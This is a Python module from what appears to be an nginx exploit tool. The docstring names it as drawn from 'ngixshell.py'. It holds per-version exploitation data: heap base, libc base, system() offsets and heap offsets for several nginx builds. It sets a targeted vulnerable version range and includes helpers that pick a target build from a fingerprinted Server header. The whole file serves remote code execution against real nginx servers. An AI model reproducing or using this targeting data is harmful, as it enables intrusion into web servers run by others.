"""
engines/builds.py — Extended KNOWN_BUILDS database (from ngixshell.py) and helpers.
"""
from __future__ import annotations

from config import DEFAULT_HEAP_OFFSETS

# Extended build database (superset of config.KNOWN_BUILDS, from ngixshell.py)
KNOWN_BUILDS_EXTENDED: dict = {
    "nginx/1.25.3-glibc": {
        "heap_base":  0x5555556cc000,
        "libc_base":  0x7ffff77bb000,
        "sys_offset": 0x4c490,
        "offsets": DEFAULT_HEAP_OFFSETS,
    },
    "nginx/1.29.5-glibc": {
        "heap_base":  0x5555556e6000,
        "libc_base":  0x7ffff7573000,
        "sys_offset": 0x53110,
        "offsets": DEFAULT_HEAP_OFFSETS,
    },
    "nginx/1.26.3-musl": {
        "heap_base":  0x555555686000,
        "libc_base":  0x7ffff7f5c000,
        "sys_offset": 0x449fd,
        "offsets": DEFAULT_HEAP_OFFSETS,
    },
    "1.25.3-glibc": {
        "heap_base":  0x555555659000,
        "libc_base":  0x7ffff77ba000,
        "sys_offset": 0x50d70,
        "offsets": DEFAULT_HEAP_OFFSETS,
    },
    "1.30.0-glibc": {
        "heap_base":  0x55555566f000,
        "libc_base":  0x7ffff77b8000,
        "sys_offset": 0x50d70,
        "offsets": [0x44427, 0xa3147, 0xa7f57],
    },
    "_default": {
        "heap_base":  0x555555659000,
        "libc_base":  0x7ffff77ba000,
        "sys_offset": 0x50d70,
        "offsets": DEFAULT_HEAP_OFFSETS,
    },
}

VULN_MIN = (0, 6, 27)
VULN_MAX = (1, 30, 0)


def _auto_select_build(version_str: str) -> str | None:
    """Pick the best known-build key from fingerprinted Server header."""
    for key in KNOWN_BUILDS_EXTENDED:
        if key.startswith("_"):
            continue
        ver_part = key.rsplit("-", 1)[0]
        if ver_part in version_str:
            return key
    return None


def _apply_build(build_key: str | None, *, heap_base=None, libc_base=None,
                 system_addr=None, offsets=None) -> dict:
    """Return merged build dict from key + any overrides."""
    if build_key and build_key in KNOWN_BUILDS_EXTENDED:
        b = dict(KNOWN_BUILDS_EXTENDED[build_key])
    else:
        b = dict(KNOWN_BUILDS_EXTENDED["_default"])
    if heap_base   is not None:
        b["heap_base"] = heap_base
    if libc_base   is not None:
        b["libc_base"] = libc_base
    if system_addr is not None:
        b["sys_offset"] = system_addr - b["libc_base"]
    if offsets     is not None:
        b["offsets"] = offsets
    return b
